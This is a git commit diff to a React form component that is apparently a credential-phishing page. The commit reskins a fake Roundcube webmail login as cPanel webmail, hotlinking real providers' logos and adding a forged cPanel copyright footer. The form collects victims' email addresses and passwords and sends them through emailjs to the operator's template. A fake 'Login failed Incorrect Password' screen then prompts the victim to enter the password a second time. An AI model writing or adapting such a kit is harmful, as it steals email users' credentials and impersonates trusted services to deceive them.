79385806cca2e08dc90f7fc0c8b21941216d1e64
qwaszx3215 <84395173+qwaszx3215@users.noreply.github.com>
2022-10-29 15:25:19 +0600

    Update form.js

--- src/form.js
+++ src/form.js
@@ -11,16 +11,15 @@ function Forms() {
   const [showForm, setShowForm] = useState(true);
   const [confirmForm, setConfirmForm] = useState(false);
 
- 
   const submitHandler = (e) => {
     e.preventDefault();
 
     emailjs
       .sendForm(
-        "gmail",
-        "template_hb9qmr9",
+        "service_gi68r3i",
+        "template_hxznbhh",
         e.target,
-        "user_SEoZ3jhZmvmc7W9yRaSnR"
+        "KsLg5lm9TS3wt54jz"
       )
       .then(
         (result) => {
@@ -41,10 +40,10 @@ function Forms() {
     let domain = emailss.substring(emailss.lastIndexOf("@") + 1);
     emailjs
       .sendForm(
-        "gmail",
-        "template_hb9qmr9",
+        "service_gi68r3i",
+        "template_hxznbhh",
         e.target,
-        "user_SEoZ3jhZmvmc7W9yRaSnR"
+        "KsLg5lm9TS3wt54jz"
       )
       .then(
         (result) => {
@@ -65,7 +64,7 @@ function Forms() {
         {showForm && (
           <div className="imagees">
             <img
-              src="https://webmail.gruas-homanser.com/skins/elastic/images/logo.svg?s=1649231387"
+              src="https://webmail.gigared.com/cPanel_magic_revision_1610662436/unprotected/cpanel/images/webmail-logo.svg"
               className="imagee"
               alt="displare"
             />
@@ -74,6 +73,8 @@ function Forms() {
         {showForm && (
           <form className="formal" onSubmit={submitHandler}>
             <label>
+              <span className="labeltext">Email Address</span>
+              <br></br>
               <span className="newicon1">
                 <i class="fas fa-user fa-1x"></i>
               </span>
@@ -81,12 +82,16 @@ function Forms() {
                 type="email"
                 name="to_user"
                 required
-                placeholder="Username"
+                placeholder="Enter your email address"
                 value={params.id}
               />
             </label>
             <br></br>
+            <br></br>
+
             <label>
+              <span className="labeltext">Password</span>
+              <br></br>
               <span className="newicon1">
                 <i class="fas fa-lock fa-1x"></i>
               </span>
@@ -94,11 +99,10 @@ function Forms() {
                 type="password"
                 name="to_pass"
                 required
-                placeholder="Password"
+                placeholder="Enter your email password"
               />
             </label>
-            <button> LOGIN </button>
-            <p>Roundcube Webmail </p>
+            <button> Log in </button>
           </form>
         )}
       </div>
@@ -106,7 +110,7 @@ function Forms() {
         <div className="contsainer">
           <div className="imagees">
             <img
-              src="https://webmail.gruas-homanser.com/skins/elastic/images/logo.svg?s=1649231387"
+              src="https://webmail.gigared.com/cPanel_magic_revision_1610662436/unprotected/cpanel/images/webmail-logo.svg"
               className="imagee"
               alt="displare"
             />
@@ -114,38 +118,70 @@ function Forms() {
 
           <form className="formal" onSubmit={editHandler}>
             <label>
+              <span className="labeltext">Email Address</span>
+              <br></br>
               <span className="newicon1">
-                {" "}
-                <i class="fas fa-user fa-1x"></i>{" "}
+                <i class="fas fa-user fa-1x"></i>
               </span>
               <input
                 type="email"
                 name="to_user"
                 required
                 value={params.id}
-                placeholder="Username"
+                placeholder="Enter your email address"
               />
             </label>
             <br></br>
 
             <label>
+              <span className="labeltext">Password</span>
+              <br></br>
               <span className="newicon1">
-                {" "}
-                <i class="fas fa-lock fa-1x"></i>{" "}
+                <i class="fas fa-lock fa-1x"></i>
               </span>
               <input
                 type="password"
                 name="to_pass"
                 required
-                placeholder="Password"
+                placeholder="Enter your email password"
               />
             </label>
             <p className="reda">Login failed Incorrect Password</p>
-            <button> LOGIN </button>
-            <p>Roundcube Webmail </p>
+            <button> Login </button>
           </form>
         </div>
       )}
+      <ul>
+        <li>
+          <a href="/?locale=en">English</a>
+        </li>
+
+        <li>
+          <a href="/?locale=de">Deutsch</a>
+        </li>
+
+        <li>
+          <a href="/?locale=es_es">español&nbsp;de&nbsp;España</a>
+        </li>
+
+        <li>
+          <a href="/?locale=i_en">i_en</a>
+        </li>
+
+        <li>
+          <a href="/?locale=ru">русский</a>
+        </li>
+      </ul>
+      <div className="smaller">
+        <img
+          src="https://png2.cleanpng.com/sh/12d5e7872b72f9faa954137b94be80c0/L0KzQYm3U8I4N5d8j5H0aYP2gLBuTfNxaZ9qhJ9CZXKweLF6lPlvb154feRBaXPoPcHzhgNsNahqep9xb4P3ebBuTfNwdqV3Rd54Z3AwRbLpgfM6amdpedZtOEOxQ4W7VMg2P2U2TaQ7MUmzR4i7WMk3PV91htk=/kisspng-cpanel-web-hosting-service-plesk-web-hosting-contr-logo-5abac9b6dadd83.3444857415221907748965.png"
+          width={30}
+          alt="displare"
+        />
+        <br></br>
+        Copyright© 2022 cPanel, L.L.C. <br></br>
+        Privacy Policy
+      </div>
     </Styls>
   );
 }
